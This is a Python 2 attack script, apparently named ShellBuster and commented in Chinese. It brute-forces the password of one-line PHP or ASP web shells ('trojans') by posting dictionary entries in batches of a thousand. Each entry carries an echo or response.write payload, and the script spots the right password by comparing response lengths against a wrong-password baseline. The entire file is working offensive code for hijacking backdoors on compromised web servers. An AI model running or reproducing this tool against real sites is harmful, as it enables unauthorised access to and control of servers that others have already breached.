#!/usr/bin/env python
#-*-coding:utf-8-*-
# coding by v5est0r
# 单次多变量提交变量方式,一句话爆破提速千倍

import ConfigParser
import sys

import requests

shell = raw_input("请输入木马的url：")
shell_type = raw_input("请输入木马脚本类型如asp：")
pass_dic = raw_input("请输入字典文件位置：")

print '''

   Usage:python ShellBuster.py shell_url shell_type dic_dir

              Code by binghe/v5est0r
'''


post_data = {}  # 创建字典集
s = open(pass_dic, 'r')
content = s.readlines()  # 分行读取字典
dics = len(content) / 1000

print '当前字典中变量个数为: %s' % str(len(content))

print "字典将被分割为 %s 份" % str(dics)

group = []  # 字典每行独立化,写入元组
for h in range(0, len(content)):
    password = str(content[h]).strip('\n')  # 剔除换行符
    group.append(password)
# print group


if str(shell_type) == "php":
    post_test = {'test_pass_test': 'echo "test!!";'}
    res = requests.post(shell, data=post_test)
    wrong_res = res.text
    post_test.clear()

    for i in range(0, dics):
        new_group = []
        for k in range(i * 1000, (i + 1) * 1000):
            new_group.append(group[k])
            k += 1
        for each in new_group:
            post_data[each] = 'echo "password is %s";' % each
        r = requests.post(shell, data=post_data)
        # print "正在进行第 %s 组字典爆破" % str(i + 1)
        post_data.clear()
        i += 1
        print r.text
        if len(r.text) != len(wrong_res):
            break

    new_group1 = []
    for kk in range(dics * 1000, len(content)):
        new_group1.append(group[kk])
        kk += 1
    for each in new_group1:
        post_data[each] = 'echo "password is %s";' % each
    r = requests.post(shell, data=post_data)
    print "正在进行余数字典爆破"
    print r.text

# v5est0r=response.write("password:v5est0r")

if shell_type == 'asp':
    # 下面建立错误密码的返回标识符
    post_test = {'test_pass_test': 'response.write("test!!!")'}
    res = requests.post(shell, data=post_test)
    wrong_res = res.text
    post_test.clear()

    for i in range(0, dics):
        new_group = []
        for k in range(i * 1000, (i + 1) * 1000):
            new_group.append(group[k])
            k += 1
        for each in new_group:
            post_data[each] = 'response.write("password: %s")' % each
        r = requests.post(shell, data=post_data)
        print "正在进行第 %s 组字典爆破" % str(i + 1)
        post_data.clear()
        i += 1
        print r.text
        if len(r.text) != len(wrong_res):
            break

    new_group1 = []
    for kk in range(dics * 1000, len(content)):
        new_group1.append(group[kk])
        kk += 1
    for each in new_group1:
        post_data[each] = 'response.write("password: %s\t")' % each
    r = requests.post(shell, data=post_data)
    print "正在进行余数字典爆破"
    print r.text
